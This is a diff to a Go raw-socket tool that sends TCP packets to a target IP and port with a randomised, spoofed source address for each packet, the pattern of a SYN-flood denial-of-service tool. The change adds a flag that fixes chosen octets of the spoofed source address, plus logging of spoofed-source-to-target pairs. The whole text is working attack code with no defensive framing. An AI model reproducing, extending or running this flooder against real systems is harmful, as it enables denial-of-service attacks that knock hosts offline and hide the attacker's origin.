@@ -14,6 +14,7 @@ import (
 func main() {
 	host := flag.String("h", "", "Target IP")
 	port := flag.Int("p", 0, "Target Port")
+	source_mask := flag.String("sm", "0.0.0.0", "Source IP mask")
 	flag.Parse()
 
 	if *host == "" {
@@ -26,17 +27,27 @@ func main() {
 		return
 	}
 
-	ipv4Addr := net.ParseIP(*host).To4()
+	if *source_mask == "" {
+		fmt.Println("use source mask default 0.0.0.0 (world-wide)")
+	}
+
+	ipv4Addr_host := net.ParseIP(*host).To4()
 	//目前没有实现ipv6
-	if ipv4Addr == nil {
+	if ipv4Addr_host == nil {
 		fmt.Println("parameter h invalid IPv4 address")
 		return
 	}
 
-	handle(ipv4Addr, *port)
+	ipv4Addr_source_mask := net.ParseIP(*source_mask).To4()
+	if ipv4Addr_source_mask == nil {
+		fmt.Println("parameter sm invalid IPv4 address mask")
+		return
+	}
+
+	handle(ipv4Addr_host, *port, ipv4Addr_source_mask)
 }
 
-func handle(ip net.IP, port int) {
+func handle(ip net.IP, port int, source_mask net.IP) {
 	//创建原始套接字
 	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
 	if err != nil {
@@ -59,8 +70,30 @@ func handle(ip net.IP, port int) {
 				srcIP := net.IP(make([]byte, 4))
 				binary.BigEndian.PutUint32(srcIP[0:4], uint32(rand.Intn(1<<32-1)))
 				
+				for j := 0; j < 4; j++ {
+					if source_mask[j] == 0 {
+						continue
+					}
+					// fmt.Printf("replace %v with %v", srcIP[j], source_mask[j])
+					// stupid coding,.... 
+					if j == 0 {
+						srcIP = net.IPv4(source_mask[0], srcIP[1], srcIP[2], srcIP[3])
+					}
+					if j == 1 {
+						srcIP = net.IPv4(srcIP[0], source_mask[1], srcIP[2], srcIP[3])
+					}
+					if j == 2 {
+						srcIP = net.IPv4(srcIP[0], srcIP[1], source_mask[2], srcIP[3])
+					}
+					if j == 3 {
+						srcIP = net.IPv4(srcIP[0], srcIP[1], srcIP[2], source_mask[3])
+					}
+				}
+
 				ipv4Byte, _ := getIPV4Header(srcIP,ip)
 				tcpByte, _ := getTcpHeader(srcIP,ip,port)
+
+				// fmt.Printf("Debug: %v %v",source_mask, srcIP)
 
 				//var b bytes.Buffer
 				//b.Write(ipv4Byte)
@@ -74,7 +107,7 @@ func handle(ip net.IP, port int) {
 //					Addr: ip,
 				}
 				copy(addr.Addr[:4],ip)
-				fmt.Printf("Sendto %v %v \n",ip,port )
+				fmt.Printf("%v -->  %v %v \n",srcIP,ip,port )
 				error := syscall.Sendto(fd, buffs, 0, &addr )
 				if error != nil{
 					fmt.Println("Sendto error ",error )
